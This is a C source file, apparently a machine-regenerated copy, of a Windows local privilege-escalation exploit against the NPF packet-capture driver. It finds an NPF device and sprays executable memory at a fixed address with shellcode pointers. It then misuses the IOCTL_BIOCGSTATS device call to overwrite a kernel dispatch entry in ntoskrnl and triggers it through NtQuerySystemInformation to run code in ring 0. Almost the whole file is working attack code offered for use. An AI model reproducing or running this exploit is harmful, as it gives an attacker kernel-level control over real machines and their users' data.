#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  QueryBuffer ;
typedef  int /*<<< orphan*/  (* PQUERYSYSTEM ) (int,int /*<<< orphan*/ *,int,int /*<<< orphan*/ *) ;
typedef  char* LPVOID ;
typedef  int LPBYTE ;
typedef  int /*<<< orphan*/  HANDLE ;
typedef  int DWORD ;
typedef  int /*<<< orphan*/  BYTE ;

/* Variables and functions */
 int /*<<< orphan*/  CreateFileA (char*,int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 scalar_t__ DeviceIoControl (int /*<<< orphan*/ ,int /*<<< orphan*/ ,char*,int /*<<< orphan*/ ,char*,int /*<<< orphan*/ ,int*,int /*<<< orphan*/ *) ; 
 int GENERIC_READ ; 
 int GENERIC_WRITE ; 
 int /*<<< orphan*/  GetModuleHandleA (char*) ; 
 scalar_t__ GetNpfDevice (char*) ; 
 char* GetNtosBase () ; 
 int GetNtosDelta () ; 
 scalar_t__ GetProcAddress (int /*<<< orphan*/ ,char*) ; 
 int /*<<< orphan*/  INVALID_HANDLE_VALUE ; 
 int /*<<< orphan*/  IOCTL_BIOCGSTATS ; 
 int MEM_COMMIT ; 
 int MEM_RESERVE ; 
 int /*<<< orphan*/  OPEN_EXISTING ; 
 int /*<<< orphan*/  OUT_SIZE ; 
 int /*<<< orphan*/  PAGE_EXECUTE_READWRITE ; 
 char* ShellCode ; 
 char* VirtualAlloc (char*,int,int,int /*<<< orphan*/ ) ; 
 char* g_PatchAddress ; 
 int /*<<< orphan*/  printf (char*,...) ; 

int main(int argc, char **argv)
{
	HANDLE       hDevice;
	LPVOID		 lpNtosSwitch;
	DWORD		 cb, delta;
	DWORD		 values[4];
	LPVOID		 lpFakeTable;
	PQUERYSYSTEM NtQuerySystemInformation;
	char		 szNpfDevice[100];
	BYTE		 QueryBuffer[0x24];
	int			 i;	
	
	NtQuerySystemInformation = (PQUERYSYSTEM) GetProcAddress(GetModuleHandleA("NTDLL.DLL"),"NtQuerySystemInformation");	
	
	printf ("Searching for a valid Interface ...\n");

	if ( GetNpfDevice(szNpfDevice) )
	{
		printf("NPF Device name generated! : %s\n",szNpfDevice);
	}

	else
	{
		printf("Cannot found any valid Interface!\n");
		return 0;
	}

	if ( lpFakeTable = VirtualAlloc((LPVOID)0x570000,
									0x20000,
									MEM_COMMIT|MEM_RESERVE,
									PAGE_EXECUTE_READWRITE) )
	{
		printf("Memory allocated at %p\n",lpFakeTable);	

		for ( i=0; i < ( 0x20000/sizeof(LPVOID) ); i++)
		{
			* ( (LPVOID *)lpFakeTable + i) = ShellCode;			
		}

		printf("Memory mapping filled! ... \n");

	}

	else
	{
		printf("Cannot allocate memory!\n");
		return 0;
	}	

	if ( (hDevice = CreateFileA(szNpfDevice,
		  GENERIC_READ|GENERIC_WRITE,
		  0,
		  0,
		  OPEN_EXISTING,
		  0,
		  NULL) ) != INVALID_HANDLE_VALUE )
	{
		printf("Device %s succesfully opened!\n", szNpfDevice);

		if ( (lpNtosSwitch = GetNtosBase()) && ( delta = GetNtosDelta()) )
		{
			g_PatchAddress = (LPVOID) ((LPBYTE) lpNtosSwitch + delta );
												
			if ( DeviceIoControl(hDevice, 
								IOCTL_BIOCGSTATS, 
								(LPVOID)0,0,
								(LPVOID)values,OUT_SIZE,
								&cb,  
								NULL) )
			{
				printf("First time reading ... bytes returned %#x\n",cb);

				for (i = 0;i<4;i++)
				{
					printf ("OutBuffer[i] = %#x\n",values[i]);
				}				
			}			

			printf("Launching exploit ... \nOverwritting NTOSKRNL switch at -> %#p\n",g_PatchAddress);
		
			
			if ( DeviceIoControl(hDevice, 
								 IOCTL_BIOCGSTATS, 
								(LPVOID)0,0,
								(LPVOID)g_PatchAddress,OUT_SIZE,
								&cb,  
								NULL) )

			{	
				// Dirty trick .. 				
				NtQuerySystemInformation(0x15,QueryBuffer,sizeof(QueryBuffer), NULL);
				// Bye bye god mode!
				printf("We are back from ring0!\n");
			}
		}
	}

	else
	{
		printf("Error: Cannot open device %s\n",szNpfDevice);
	}
}